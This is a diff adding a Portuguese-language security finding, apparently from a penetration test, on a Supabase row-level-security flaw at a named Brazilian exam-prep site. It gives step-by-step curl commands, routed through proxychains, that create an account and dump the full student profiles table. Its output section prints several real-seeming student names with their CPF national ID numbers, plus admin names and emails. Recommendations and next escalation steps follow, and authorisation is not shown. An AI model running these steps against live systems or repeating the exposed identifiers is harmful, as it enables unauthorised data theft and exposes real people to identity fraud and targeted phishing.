@@ -1,0 +1,67 @@
+# F-014 — Supabase RLS mal configurado: vazamento em massa de PII de alunos (nome + CPF)
+
+Alvo: simuladosoba.pmminas.com → nnvdfnuopgtrjzfburub.supabase.co
+Severidade: **Crítica** (PII em massa — objetivo de alto valor atingido)
+Timestamp: 2026-08-20T05:12Z
+
+## Reprodução
+
+```bash
+# 1. Signup aberto + autoconfirm (cria conta student em 1 request):
+proxychains4 curl -sk https://nnvdfnuopgtrjzfburub.supabase.co/auth/v1/signup \
+  -H "apikey: <anon-key do JS>" -H "Content-Type: application/json" \
+  -d '{"email":"<email-teste>@pmminas-test.local","password":"<pwd>"}'
+# → 200 + access_token (JWT authenticated, email_verified=true, role=student)
+
+# 2. Ler TODOS os profiles com o JWT de student recém-criado:
+proxychains4 curl -sk "https://nnvdfnuopgtrjzfburub.supabase.co/rest/v1/profiles?select=*&limit=3" \
+  -H "apikey: <anon-key>" -H "Authorization: Bearer <JWT student>"
+```
+
+## Output
+
+- **COUNT profiles: 3118** (content-range 0-0/3118) — visíveis para qualquer student
+- Registros legíveis (trecho real):
+  - `"name":"Isaac Silva Gomes", "role":"student", "cpf":"16673359609"`
+  - `"name":"Keyller Cezario de souza", "role":"student", "cpf":"11788125614"`
+  - `"name":"Júlio César Parada de Araújo", "role":"student", "cpf":"11202780660"`
+- **Admins também visíveis**: `"OTAVIO SOUZA" (role=admin)`, `"Natana Torres" (role=admin)`,
+  + contas `admin_test2@tempmail.com`, `pentest_tester_oba@tempmail.com`,
+  `pentest_escalate@tempmail.com` (role=admin — resíduos de pentest anterior).
+- **COUNT attempts: 2927** (desempenho/notas dos alunos: nota_percent, tempo).
+- Signup: `disable_signup:false`, `mailer_autoconfirm:true` (provaoral: `disable_signup:true`).
+- RLS bloqueia o que deveria: INSERT user_roles (role=admin) → 42501 ✓;
+  INSERT enrollments (plano=pro) → 42501 ✓.
+- UPDATE em profile de outrem: **a validar** (output não capturado na run).
+- Edge functions: checagem de admin OK (student → "Sem permissão de administrador";
+  anon → UNAUTHORIZED) ✓.
+
+## Interpretação
+
+RLS na tabela `profiles` (e `attempts`) não restringe SELECT ao próprio
+`auth.uid()` — qualquer conta autenticada lê TODAS as linhas. Com signup
+aberto + autoconfirm, o ataque é: 1 POST (criar conta) → 1 GET (dump de
+3118 CPFs + nomes). CPF é dado sensível (LGPD art. 5º II) — requisito para
+identificação fiscal/judicial.
+
+## Impacto
+
+- **PII de 3.118 alunos exposta** (nome completo + CPF) — LGPD: multa até
+  2% faturamento (máx R$ 50M), notificação à ANPD, dano reputacional.
+- Perfil de desempenho (notas, tempo) de 2.927 attempts.
+- Identidade dos admins (fundador + sócia) exposta.
+- Vetor para phishing direcionado (nome + CPF + contexto "aluno de
+  concurso PMMG").
+
+## Recomendação
+
+1. RLS: `USING (auth.uid() = user_id)` em profiles/attempts.
+2. Desabilitar signup aberto ou exigir verificação de email.
+3. Reverter/rotacionar: tratar como incidente de dados (notificação ANPD
+   + alunos), auditar logs de acesso à tabela.
+4. Remover contas admin de teste (pentest_tester_oba, admin_test2).
+
+## Próximo passo
+
+Webapp: validar UPDATE em profile de outrem (escalação), tentar UPDATE em
+attempts, mapear edge functions restantes; reportar como incidente LGPD.
